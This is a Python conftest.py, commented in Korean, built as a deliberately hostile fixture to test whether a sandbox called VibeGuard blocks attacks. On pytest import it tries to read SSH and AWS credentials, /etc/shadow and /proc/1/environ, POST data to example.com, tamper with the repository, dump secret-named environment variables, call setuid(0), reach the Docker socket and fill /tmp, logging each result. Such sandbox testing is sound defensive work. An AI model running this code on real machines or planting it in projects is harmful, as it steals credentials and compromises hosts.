"""적대적 conftest. pytest가 import 시점에 실행한다.

침해된 리포지토리가 시도할 법한 공격을 전부 여기서 시도한다. 각 공격은 하나가 실패해도
나머지가 멈추지 않도록 감싸져 있다. 결과는 샌드박스의 쓰기 가능한 artifacts 마운트인
/out/attack_log.txt에 이어 붙으며, 덕분에 한 번 실행으로 방어 전체를 검토할 수 있다.

이 중 어느 것도 성공해서는 안 된다. VibeGuard 샌드박스 안에서만 실행할 것. README.md 참고.

로그에 찍히는 BLOCKED·SUCCEEDED와 각 공격의 이름은 verify_hostile.py가 문자열로 찾아
판정하는 표시이므로 번역하지 않는다.
"""

import os
import socket
import urllib.request

LOG_PATH = "/out/attack_log.txt"


def log(number, name, blocked, detail):
    """공격 결과 한 줄을 로그에 덧붙인다.

    blocked가 True면 샌드박스가 공격을 막았다는 뜻이고, 모든 항목에서 이것이
    우리가 원하는 결과다.
    """
    status = "BLOCKED" if blocked else "SUCCEEDED"
    line = "[{0}] {1}: {2} - {3}\n".format(number, name, status, detail)
    with open(LOG_PATH, "a") as handle:
        handle.write(line)


# 이전 실행의 로그를 지우고, 이번 실행이 어디서 시작했는지 기록한다.
with open(LOG_PATH, "w") as _handle:
    _handle.write("attack log from malicious_repo/conftest.py\n")
    _handle.write("uid={0} gid={1}\n".format(os.getuid(), os.getgid()))
    _handle.write("=" * 60 + "\n")


# 1. 크리덴셜 탈취: ssh 키와 aws 자격증명을 읽으려 시도한다.
def attack_credentials():
    targets = [
        os.path.expanduser("~/.ssh/id_rsa"),
        os.path.expanduser("~/.ssh/"),
        os.path.expanduser("~/.aws/credentials"),
    ]
    for target in targets:
        try:
            if target.endswith("/"):
                names = os.listdir(target)
                log(1, "credentials", False,
                    "listed {0}: {1}".format(target, names))
            else:
                with open(target) as handle:
                    data = handle.read()
                log(1, "credentials", False,
                    "read {0} ({1} bytes)".format(target, len(data)))
        except Exception as exc:
            log(1, "credentials", True,
                "{0}: {1}".format(target, exc))


# 2. 유출: 훔친 데이터를 외부 서버로 POST 전송한다.
def attack_exfiltration():
    try:
        request = urllib.request.Request(
            "http://example.com",
            data=b"stolen=secret",
            method="POST",
        )
        urllib.request.urlopen(request, timeout=5)
        log(2, "exfiltration", False, "POST to example.com went through")
    except Exception as exc:
        log(2, "exfiltration", True, "{0}: {1}".format(type(exc).__name__, exc))


# 3. 호스트 파일시스템 염탐.
def attack_host_files():
    for target in ("/etc/shadow", "/proc/1/environ"):
        try:
            with open(target, "rb") as handle:
                data = handle.read()
            log(3, "host files", False,
                "read {0} ({1} bytes)".format(target, len(data)))
        except Exception as exc:
            log(3, "host files", True, "{0}: {1}".format(target, exc))


# 4. 원본 리포지토리 변조.
def attack_repo_tampering():
    # 기존 파일을 수정한다.
    try:
        with open("/repo/conftest.py", "a") as handle:
            handle.write("\n# injected\n")
        log(4, "repo tampering", False, "appended to /repo/conftest.py")
    except Exception as exc:
        log(4, "repo tampering", True,
            "modify: {0}: {1}".format(type(exc).__name__, exc))
    # 새 파일을 만든다.
    try:
        with open("/repo/backdoor.py", "w") as handle:
            handle.write("owned")
        log(4, "repo tampering", False, "created /repo/backdoor.py")
    except Exception as exc:
        log(4, "repo tampering", True,
            "create: {0}: {1}".format(type(exc).__name__, exc))


# 5. 환경변수 탈취. 컨테이너 프로세스가 볼 수 있는 것을 전부 덤프하므로,
#    호스트의 비밀이 하나라도 새어 들어왔는지 로그에 그대로 드러난다.
def attack_env_dump():
    keys = sorted(os.environ.keys())
    interesting = [k for k in keys
                   if any(s in k.upper()
                          for s in ("TOKEN", "SECRET", "KEY", "AWS",
                                    "GITHUB", "PASSWORD"))]
    log(5, "env dump", True,
        "visible keys: {0}".format(keys))
    log(5, "env dump", not interesting,
        "sensitive-looking keys: {0}".format(interesting or "none"))


# 6. 권한 상승.
def attack_setuid():
    try:
        os.setuid(0)
        log(6, "setuid(0)", False, "became uid {0}".format(os.getuid()))
    except Exception as exc:
        log(6, "setuid(0)", True, "{0}: {1}".format(type(exc).__name__, exc))


# 7. Docker 소켓 접근. 여기에 닿을 수 있으면 컨테이너가 데몬을 조종할 수 있게 되고
#    샌드박스 전체가 무의미해진다. 그래서 로그에서 가장 중요한 줄이다.
def attack_docker_socket():
    path = "/var/run/docker.sock"
    if not os.path.exists(path):
        log(7, "docker socket", True, "{0} does not exist".format(path))
        return
    try:
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.connect(path)
        sock.sendall(b"GET /version HTTP/1.0\r\n\r\n")
        reply = sock.recv(256)
        sock.close()
        log(7, "docker socket", False,
            "connected, got {0!r}".format(reply[:80]))
    except Exception as exc:
        log(7, "docker socket", True,
            "exists but {0}: {1}".format(type(exc).__name__, exc))


# 8. 64m으로 제한된 /tmp tmpfs를 상대로 한 자원 고갈.
def attack_fill_tmp():
    path = "/tmp/fill.bin"
    written = 0
    chunk = b"A" * (1024 * 1024)
    try:
        with open(path, "wb") as handle:
            for _ in range(128):          # 64m tmpfs에 128m를 써 넣으려 시도한다
                handle.write(chunk)
                handle.flush()
                written += len(chunk)
        log(8, "fill /tmp", False,
            "wrote {0} MB without hitting the cap".format(written // (1024 * 1024)))
    except Exception as exc:
        log(8, "fill /tmp", True,
            "stopped after {0} MB: {1}: {2}".format(
                written // (1024 * 1024), type(exc).__name__, exc))
    finally:
        try:
            os.remove(path)
        except OSError:
            pass


for attack in (
    attack_credentials,
    attack_exfiltration,
    attack_host_files,
    attack_repo_tampering,
    attack_env_dump,
    attack_setuid,
    attack_docker_socket,
    attack_fill_tmp,
):
    try:
        attack()
    except Exception as exc:  # 한 공격의 버그가 나머지를 멈추게 해서는 안 된다
        log(0, attack.__name__, True, "attack raised: {0}".format(exc))
